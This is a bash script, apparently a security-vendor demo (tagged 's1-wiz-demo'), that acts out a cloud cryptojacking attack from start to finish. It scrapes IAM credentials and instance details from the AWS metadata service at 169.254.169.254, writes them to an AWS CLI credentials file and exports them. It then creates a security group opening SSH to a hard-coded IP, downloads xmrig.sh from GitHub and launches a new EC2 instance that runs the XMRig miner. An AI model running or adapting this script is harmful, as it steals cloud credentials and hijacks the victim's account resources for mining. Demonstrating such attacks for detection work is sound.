#!/bin/bash

# Some variables to make colorized output easier to manage..
Color_Off='\033[0m'       # Text Resets
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

function yellow_output() {
    printf "\n${Yellow}$1\n${Color_Off}"
}

# Scrape credentials from the AWS IMDS service (metadata URL)
yellow_output "Scraping credentials from the AWS IMDS service..."
SG_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
METADATA_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$SG_NAME)
ACCESS_KEY_ID=$(echo $METADATA_TOKEN | jq -r ".AccessKeyId")
SECRET_ACCESS_KEY=$(echo $METADATA_TOKEN | jq -r ".SecretAccessKey")
TOKEN=$(echo $METADATA_TOKEN | jq -r ".Token")
yellow_output "Accessing Instance Identity Document from the AWS IMDS service..."
INSTANCE_IDENTITY_DOCUMENT=$(curl --silent http://169.254.169.254/latest/dynamic/instance-identity/document)
ACCT_ID=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".accountId")
REGION=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".region")
INSTANCE_ID=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".instanceId")
IMAGE_ID=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".imageId")
INSTANCE_TYPE=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".instanceType")
AZ=$(echo $INSTANCE_IDENTITY_DOCUMENT | jq -r ".availabilityZone")
SECURITY_GROUPS=$(curl --silent http://169.254.169.254/latest/meta-data/security-groups)
INTERFACE=$(curl --silent http://169.254.169.254/latest/meta-data/network/interfaces/macs/)
SUBNET_ID=$(curl --silent http://169.254.169.254/latest/meta-data/network/interfaces/macs/${INTERFACE}/subnet-id)
VPC_ID=$(curl --silent http://169.254.169.254/latest/meta-data/network/interfaces/macs/${INTERFACE}/vpc-id)
TAGS="ResourceType=instance,Tags=[{Key='Name',Value='cha-ching'},{Key='Environment',Value='s1-wiz-demo'},{Key='Owner',Value='Johnny_Ataquero'}]"
IAM_INFO=$(curl --silent http://169.254.169.254/latest/meta-data/iam/info)
INSTANCE_PROFILE_ARN=$(echo $IAM_INFO | jq -r ".InstanceProfileArn")


# Create a new credentials file in /home/$USER
yellow_output "Creating AWSCLI credentials file..."
mkdir -p /home/$USER/.aws
cat << EOF > /home/$USER/.aws/credentials
[default]
aws_access_key_id = $ACCESS_KEY_ID
aws_secret_access_key = $SECRET_ACCESS_KEY
region = $REGION
EOF

# OR.. using environment variables
yellow_output "Exporting AWS Keys/Tokens..."
export AWS_ACCESS_KEY_ID=$ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$SECRET_ACCESS_KEY
export AWS_SESSION_TOKEN=$TOKEN


#aws ec2 describe-instances

# Use awscli to create a new EC2 instances to run a coinminer
yellow_output "Creating new EC2 instance to run XMRig (coinminer)..."
KEY_NAME=s1
SG_NAME=SG-s1-wiz
SG_DESC=SG-s1-wiz

sg_response=$(aws ec2 create-security-group --group-name $SG_NAME --description "${SG_DESC}" --vpc-id $VPC_ID)
SG_ID=$(echo $sg_response | jq -r ".GroupId")
MY_IP="75.190.238.157"  #$(curl --silent https://checkip.amazonaws.com)
aws ec2 authorize-security-group-ingress --group-id $SG_ID --protocol tcp --port 22 --cidr "${MY_IP}/32" > /dev/null 2>&1 

# Download xmrig.sh from repo to pass to EC2 instance
curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/main/xmrig.sh

ec2_run_instances=$(aws ec2 run-instances --image-id $IMAGE_ID --count 1 --instance-type $INSTANCE_TYPE \
--key-name $KEY_NAME --security-group-ids $SG_ID --subnet-id $SUBNET_ID --tag-specifications $TAGS \
--iam-instance-profile "Arn=${INSTANCE_PROFILE_ARN}" --user-data file://xmrig.sh)  
  
  
# #--user-data file://$STARTUP_SCRIPT_PATH 
# PUBLIC_KEY=
# mkdir -p ~/.ssh
# echo $PUBLIC_KEY >> ~/.ssh/authorized_keys


yellow_output "Done."